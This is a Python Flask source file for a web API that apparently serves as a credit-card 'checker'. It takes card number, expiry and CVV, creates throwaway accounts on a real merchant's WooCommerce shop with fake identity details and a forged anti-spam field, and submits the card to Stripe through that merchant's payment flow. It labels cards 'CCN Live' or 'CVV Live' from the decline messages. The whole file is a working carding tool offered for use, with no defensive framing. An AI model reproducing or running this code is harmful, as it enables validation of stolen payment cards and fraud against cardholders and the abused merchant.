import random
import re
import time
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True
if hasattr(app, 'json'):
    app.json.compact = False


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def parse_card_input(raw):
    """Parse card input like '4242424242424242|12|26|123'."""
    raw = raw.strip()
    m = re.search(r"(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})", raw)
    if m:
        return m.group(1), m.group(2).zfill(2), m.group(3), m.group(4)
    return None


def check_card(card, mm, yy, cvv):
    """Check a single card via Stripe auth."""
    from datetime import datetime
    try:
        if len(str(yy)) == 2:
            yy = str(2000 + int(str(yy)))
            
        now = datetime.now()
        curr_year = now.year
        curr_month = now.month
        card_mm = int(mm)
        card_yy = int(yy)
        
        if card_yy < curr_year or (card_yy == curr_year and card_mm < curr_month):
            return "DECLINED", "Expired Card", str(yy)
    except Exception:
        pass

    response_text = "Unknown Error"
    status = "DECLINED"

    try:
        session = requests.Session()
        mail = f"criehs4d{random.randint(584, 5658)}@gmail.com"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,hi;q=0.6,sl;q=0.5',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }

        resp1 = session.get('https://madbarn.ca/my-account/add-payment-method/', headers=headers, timeout=15)
        nonce = gets(resp1.text, 'name="woocommerce-register-nonce" value="', '"')

        if nonce:
            post_headers = headers.copy()
            post_headers['content-type'] = 'application/x-www-form-urlencoded'
            post_headers['origin'] = 'https://madbarn.ca'
            post_headers['referer'] = 'https://madbarn.ca/my-account/add-payment-method/'
            post_headers['sec-fetch-site'] = 'same-origin'

            data = {
                'email': mail,
                'billing_first_name': 'Nexix',
                'billing_last_name': 'Boy',
                'billing_phone': '+1 628 302 9044',
                'wc_order_attribution_source_type': '',
                'wc_order_attribution_referrer': '',
                'wc_order_attribution_utm_campaign': '',
                'wc_order_attribution_utm_source': '',
                'wc_order_attribution_utm_medium': '',
                'wc_order_attribution_utm_content': '',
                'wc_order_attribution_utm_id': '',
                'wc_order_attribution_utm_term': '',
                'wc_order_attribution_utm_source_platform': '',
                'wc_order_attribution_utm_creative_format': '',
                'wc_order_attribution_utm_marketing_tactic': '',
                'wc_order_attribution_session_entry': '',
                'wc_order_attribution_session_start_time': '',
                'wc_order_attribution_session_pages': '3',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': headers['user-agent'],
                'mc_for_woocommerce_wp_registration_form_check': '0',
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register',
                'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJlbWFpbCBiaWxsaW5nX2ZpcnN0X25hbWUgYmlsbGluZ19sYXN0X25hbWUgYmlsbGluZ19waG9uZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zb3VyY2VfdHlwZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9yZWZlcnJlciB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fY2FtcGFpZ24gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX3NvdXJjZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fbWVkaXVtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jb250ZW50IHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9pZCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fdGVybSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlX3BsYXRmb3JtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jcmVhdGl2ZV9mb3JtYXQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX21hcmtldGluZ190YWN0aWMgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9lbnRyeSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3N0YXJ0X3RpbWUgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9wYWdlcyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3N0YXJ0X3RpbWUgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9wYWdlcyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3N0YXJ0X3RpbWUgd2Nfb3JkZXJfYXR0cmlidXRpb25fc2Vzc2lvbl9jb3VudCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91c2VyX2FnZW50IG1jX2Zvcl93b29jb21tZXJjZV93cF9yZWdpc3RyYXRpb25fZm9ybV9jaGVjayB3b29jb21tZXJjZS1yZWdpc3Rlci1ub25jZSBfd3BfaHR0cF9yZWZlcnJlciIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjIzfX0=',
            }
            session.post('https://madbarn.ca/my-account/add-payment-method/', headers=post_headers, data=data, timeout=15)

        get_headers = headers.copy()
        get_headers['referer'] = 'https://madbarn.ca/my-account/add-payment-method/'
        get_headers['sec-fetch-site'] = 'same-origin'
        resp2 = session.get('https://madbarn.ca/my-account/add-payment-method/', headers=get_headers, timeout=15)
        pattern = r'"createAndConfirmSetupIntentNonce":"(.*?)"'
        match = re.search(pattern, resp2.text)

        if not match:
            if "woocommerce-error" in resp2.text:
                response_text = "Merchant Registration Failed (Anti-Spam or Validation)"
            else:
                response_text = "Failed to extract payment nonce from merchant"
        else:
            payment_nonce = match.group(1)

            stripe_data = {
                'type': 'card',
                'card[number]': card,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'payment_user_agent': 'stripe.js/328730e3ee; stripe-js-v3/328730e3ee; payment-element; deferred-intent',
                'key': 'pk_live_51EVoUxGFgjkKNoyMaJZFJEyPdQVZwB0yHAcO0yBnzeuj0GHAc1QhumUtITkGbvP20jbdyHLPRv4hxSLzArtn893300Mzv62zFs',
            }

            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': headers['user-agent']
            }

            stripe_resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
            stripe_json = stripe_resp.json()

            if 'error' in stripe_json:
                response_text = stripe_json['error'].get('message', stripe_json['error'].get('code', 'Unknown Stripe Error'))
                if "security code is incorrect" in response_text.lower():
                    status = "APPROVED"
                    response_text = "CCN Live - " + response_text
                elif "insufficient funds" in response_text.lower():
                    status = "APPROVED"
                    response_text = "CVV Live - " + response_text
            else:
                pm_id = stripe_json.get('id')
                if not pm_id:
                    response_text = "Failed to create payment method"
                else:
                    params = {
                        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                    }
                    final_data = {
                        'action': 'create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': payment_nonce,
                    }
                    final_headers = headers.copy()
                    final_headers['x-requested-with'] = 'XMLHttpRequest'

                    final_resp = session.post('https://madbarn.ca/', params=params, headers=final_headers, data=final_data, timeout=15)
                    try:
                        final_json = final_resp.json()
                        if final_json.get('success'):
                            status = "APPROVED"
                            response_text = "Payment Method Added Successfully"
                        elif final_json.get('data') and final_json['data'].get('error'):
                            err_msg = final_json['data']['error'].get('message', '')
                            if "security code is incorrect" in err_msg.lower():
                                status = "APPROVED"
                                response_text = "CCN Live - " + err_msg
                            elif "insufficient funds" in err_msg.lower():
                                status = "APPROVED"
                                response_text = "CVV Live - " + err_msg
                            else:
                                if "no reason provided" in err_msg.lower() or "generic" in err_msg.lower():
                                    err_msg = "Card Declined by Issuer (Generic)"
                                response_text = err_msg or "Card Declined"
                        else:
                            response_text = str(final_json)
                    except Exception:
                        response_text = final_resp.text[:100]

    except requests.Timeout:
        response_text = "Connection Timed Out"
    except Exception as e:
        response_text = str(e)

    return status, response_text, yy


@app.route('/')
def home():
    return jsonify({
        "status": "alive",
        "usage": "/st?cc=card|mm|yy|cvv",
        "example": "/st?cc=4242424242424242|12|26|123",
        "credit": "@xoxhunterxd"
    })


@app.route('/st')
def stripe_check():
    cc = request.args.get('cc', '').strip()

    if not cc:
        return jsonify({
            "error": "Missing 'cc' parameter",
            "usage": "/st?cc=card|mm|yy|cvv",
            "example": "/st?cc=4242424242424242|12|26|123",
            "credit": "@xoxhunterxd"
        }), 400

    parsed = parse_card_input(cc)
    if not parsed:
        return jsonify({
            "error": "Invalid card format",
            "usage": "/st?cc=card|mm|yy|cvv",
            "example": "/st?cc=4242424242424242|12|26|123",
            "credit": "@xoxhunterxd"
        }), 400

    card, mm, yy, cvv = parsed

    start_time = time.time()
    status, response_text, yy_full = check_card(card, mm, yy, cvv)
    elapsed = round(time.time() - start_time, 2)

    return jsonify({
        "card": f"{card}|{mm}|{yy_full}|{cvv}",
        "gateway": "Stripe Auth",
        "status": status,
        "response": response_text,
        "time": f"{elapsed}s",
        "credit": "@xoxhunterxd"
    })


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)
